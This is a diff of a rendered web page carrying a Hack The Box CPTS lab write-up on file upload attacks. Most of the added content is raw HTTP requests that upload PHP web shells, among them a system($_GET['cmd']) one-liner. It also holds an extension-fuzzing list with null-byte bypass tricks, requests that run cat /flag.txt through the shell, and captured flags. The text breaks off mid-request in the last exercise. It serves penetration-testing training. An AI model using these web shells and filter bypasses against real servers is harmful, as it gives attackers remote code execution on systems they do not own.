@@ -17673,9 +17673,36 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#file-upload-attacks" class="md-nav__link">
+  <a href="#basic-exploitation" class="md-nav__link">
     <span class="md-ellipsis">
-      File Upload Attacks
+      Basic Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypassing-filters" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing filters
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#other-upload-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Other Upload Attacks
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#skills-assessment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Skills Assessment
     </span>
   </a>
   
@@ -17699,11 +17726,438 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 
 <h1 id="cpts-labs-20-file-upload-attacks">CPTS labs - 20 File Upload Attacks</h1>
-<h2 id="file-upload-attacks"><a href="https://academy.hackthebox.com/module/details/136">File Upload Attacks</a></h2>
+<p>Module:  <a href="https://academy.hackthebox.com/module/details/136">File Upload Attacks</a></p>
+<h2 id="basic-exploitation">Basic Exploitation</h2>
+<p><strong>Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.</strong></p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span>
+<span class="normal"><a href="#__codelineno-0-18">18</a></span>
+<span class="normal"><a href="#__codelineno-0-19">19</a></span>
+<span class="normal"><a href="#__codelineno-0-20">20</a></span>
+<span class="normal"><a href="#__codelineno-0-21">21</a></span>
+<span class="normal"><a href="#__codelineno-0-22">22</a></span>
+<span class="normal"><a href="#__codelineno-0-23">23</a></span>
+<span class="normal"><a href="#__codelineno-0-24">24</a></span>
+<span class="normal"><a href="#__codelineno-0-25">25</a></span>
+<span class="normal"><a href="#__codelineno-0-26">26</a></span>
+<span class="normal"><a href="#__codelineno-0-27">27</a></span>
+<span class="normal"><a href="#__codelineno-0-28">28</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>POST /upload.php HTTP/1.1
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>Host: 94.237.63.92:38864
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>Accept: */*
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>Content-Type: multipart/form-data; boundary=---------------------------18535087517895885263051426166
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>Content-Length: 461
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>Origin: http://94.237.63.92:38864
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a>Connection: keep-alive
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a>Referer: http://94.237.63.92:38864/
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a>-----------------------------18535087517895885263051426166
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a>Content-Disposition: form-data; name=&quot;host.php&quot;
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18"></a><span class="cp">// Execute the &#39;hostname&#39; command</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a><span class="cp">$output = shell_exec(&#39;hostname&#39;);</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20"></a>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21"></a><span class="cp">// Check if the command was successfully executed</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22"></a><span class="cp">if ($output) {</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23"></a><span class="cp">    echo &quot;The hostname of the server is: &quot; . htmlspecialchars(trim($output));</span>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24"></a><span class="cp">} else {</span>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25"></a><span class="cp">    echo &quot;Failed to retrieve the hostname.&quot;;</span>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26"></a><span class="cp">}</span>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27"></a><span class="cp">?&gt;</span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28"></a>-----------------------------18535087517895885263051426166--
+</span></code></pre></div></td></tr></table></div>
+<p><img alt="" src="../img/hostname.png" /></p>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>The hostname of the server is: ng-644144-fileuploadsabsentverification-xq5pf-6bfdbfd764-4b6pn
+</span></code></pre></div></td></tr></table></div>
+<p>Results:  ng-644144-fileuploadsabsentverification-xq5pf-6bfdbfd764-4b6pn</p>
+<p><strong>Try to exploit the upload feature to upload a web shell and get the content of /flag.txt</strong></p>
+<p><img alt="" src="../img/phpbash_01.png" /></p>
+<p>Results: HTB{g07_my_f1r57_w3b_5h3ll}</p>
+<h2 id="bypassing-filters">Bypassing filters</h2>
+<p><strong>Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)</strong></p>
+<p>We intercept the upload of the profile image and modify body, filename and content-type:</p>
+<p><img alt="" src="../img/basicshell.png" /></p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span>
+<span class="normal"><a href="#__codelineno-2-18">18</a></span>
+<span class="normal"><a href="#__codelineno-2-19">19</a></span>
+<span class="normal"><a href="#__codelineno-2-20">20</a></span>
+<span class="normal"><a href="#__codelineno-2-21">21</a></span>
+<span class="normal"><a href="#__codelineno-2-22">22</a></span>
+<span class="normal"><a href="#__codelineno-2-23">23</a></span>
+<span class="normal"><a href="#__codelineno-2-24">24</a></span>
+<span class="normal"><a href="#__codelineno-2-25">25</a></span>
+<span class="normal"><a href="#__codelineno-2-26">26</a></span>
+<span class="normal"><a href="#__codelineno-2-27">27</a></span>
+<span class="normal"><a href="#__codelineno-2-28">28</a></span>
+<span class="normal"><a href="#__codelineno-2-29">29</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>POST /upload.php HTTP/1.1
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>Host: 94.237.54.116:46941
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>Accept: */*
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>Content-Type: multipart/form-data; boundary=---------------------------8358254841159036176616308288
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>Content-Length: 516
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a>Origin: http://94.237.54.116:46941
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a>Connection: keep-alive
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a>Referer: http://94.237.54.116:46941/
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a>-----------------------------8358254841159036176616308288
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a>Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;flag.php&quot;
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>Content-Type: application/octect-stream
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17"></a>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19"></a><span class="cp">// Execute the &#39;hostname&#39; command</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20"></a><span class="cp">$output = shell_exec(&#39;cat /flag.txt&#39;);</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21"></a>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22"></a><span class="cp">// Check if the command was successfully executed</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23"></a><span class="cp">if ($output) {</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24"></a><span class="cp">    echo &quot;The flag.txt is: &quot; . htmlspecialchars(trim($output));</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25"></a><span class="cp">} else {</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26"></a><span class="cp">    echo &quot;Failed to retrieve the flag.txt.&quot;;</span>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27"></a><span class="cp">}</span>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28"></a><span class="cp">?&gt;</span>
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29"></a>-----------------------------8358254841159036176616308288--
+</span></code></pre></div></td></tr></table></div>
+<p>Then we retrieve the file:</p>
+<p><img alt="" src="../img/basicshell_01.png" /></p>
+<p>Results: HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}</p>
+<p><strong>Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt"</strong></p>
+<p>We fuzz the upload feature with the following extensions:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span>
+<span class="normal"><a href="#__codelineno-3-18">18</a></span>
+<span class="normal"><a href="#__codelineno-3-19">19</a></span>
+<span class="normal"><a href="#__codelineno-3-20">20</a></span>
+<span class="normal"><a href="#__codelineno-3-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>.jpeg.php
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>.jpg.php
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>.png.php
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>.php
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>.php3
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>.php4
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>.php5
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>.php7
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>.php8
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a>.pht
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>.phar
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a>.phpt
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a>.pgif
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a>.phtml
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>.phtm
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a>.php%00.gif
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a>.php\x00.gif
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18"></a>.php%00.png
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19"></a>.php\x00.png
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20"></a>.php%00.jpg
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21"></a>.php\x00.jpg
+</span></code></pre></div></td></tr></table></div>
+<p>This would be the request:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span>
+<span class="normal"><a href="#__codelineno-4-16">16</a></span>
+<span class="normal"><a href="#__codelineno-4-17">17</a></span>
+<span class="normal"><a href="#__codelineno-4-18">18</a></span>
+<span class="normal"><a href="#__codelineno-4-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>POST /upload.php HTTP/1.1
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>Host: 94.237.54.116:43522
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>Accept: */*
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>Content-Type: multipart/form-data; boundary=---------------------------8358254841159036176616308288
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>Content-Length: 268
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>Origin: http://94.237.54.116:46941
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>Connection: keep-alive
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>Referer: http://94.237.54.116:46941/
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>-----------------------------8358254841159036176616308288
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;shellyFUZZ&quot;
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>Content-Type: application/octect-stream
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a>-----------------------------8358254841159036176616308288--
+</span></code></pre></div></td></tr></table></div>
+<p>Then we can execute it via the <code>.phar</code> extension: </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span>
+<span class="normal"><a href="#__codelineno-5-5">5</a></span>
+<span class="normal"><a href="#__codelineno-5-6">6</a></span>
+<span class="normal"><a href="#__codelineno-5-7">7</a></span>
+<span class="normal"><a href="#__codelineno-5-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>GET /profile_images/lele.phar?cmd=cat+/flag.txt HTTP/1.1
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>Host: 94.237.54.116:43522
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>Accept: image/avif,image/webp,*/*
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a>Connection: keep-alive
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a>Referer: http://94.237.54.116:43522/
+</span></code></pre></div></td></tr></table></div>
+<p>Results: HTB{1_c4n_n3v3r_b3_bl4ckl1573d}</p>
+<p><strong>The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"</strong></p>
+<p>After fuzzing the extensions that are allowed, we find this one:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-6-10">10</a></span>
+<span class="normal"><a href="#__codelineno-6-11">11</a></span>
+<span class="normal"><a href="#__codelineno-6-12">12</a></span>
+<span class="normal"><a href="#__codelineno-6-13">13</a></span>
+<span class="normal"><a href="#__codelineno-6-14">14</a></span>
+<span class="normal"><a href="#__codelineno-6-15">15</a></span>
+<span class="normal"><a href="#__codelineno-6-16">16</a></span>
+<span class="normal"><a href="#__codelineno-6-17">17</a></span>
+<span class="normal"><a href="#__codelineno-6-18">18</a></span>
+<span class="normal"><a href="#__codelineno-6-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>POST /upload.php HTTP/1.1
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>Host: 94.237.54.42:46231
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>Accept: */*
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>Content-Type: multipart/form-data; boundary=---------------------------49468538321605629321367720460
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a>Content-Length: 276
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10"></a>Origin: http://94.237.54.116:43522
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11"></a>Connection: keep-alive
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12"></a>Referer: http://94.237.54.116:43522/
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13"></a>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14"></a>-----------------------------49468538321605629321367720460
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15"></a>Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;service.phar.png&quot;
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16"></a>Content-Type: application/octect-stream
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17"></a>
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18"></a>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19"></a>-----------------------------49468538321605629321367720460--
+</span></code></pre></div></td></tr></table></div>
+<p>Now we can execute the shell from the browser:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>http://94.237.54.42:46231/profile_images/service.phar.png?cmd=cat+/flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results: HTB{1_wh173l157_my53lf}</p>
+<p><strong>The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"</strong></p>
+<p>There are several filters in place: blacklisting, whitelisting and magic number. After submitting a real image and playing around, we find the following valid request:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span>
+<span class="normal"><a href="#__codelineno-8-11">11</a></span>
+<span class="normal"><a href="#__codelineno-8-12">12</a></span>
+<span class="normal"><a href="#__codelineno-8-13">13</a></span>
+<span class="normal"><a href="#__codelineno-8-14">14</a></span>
+<span class="normal"><a href="#__codelineno-8-15">15</a></span>
+<span class="normal"><a href="#__codelineno-8-16">16</a></span>
+<span class="normal"><a href="#__codelineno-8-17">17</a></span>
+<span class="normal"><a href="#__codelineno-8-18">18</a></span>
+<span class="normal"><a href="#__codelineno-8-19">19</a></span>
+<span class="normal"><a href="#__codelineno-8-20">20</a></span>
+<span class="normal"><a href="#__codelineno-8-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>POST /upload.php HTTP/1.1
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>Host: 94.237.55.28:30732
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>Accept: */*
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>Accept-Encoding: gzip, deflate, br
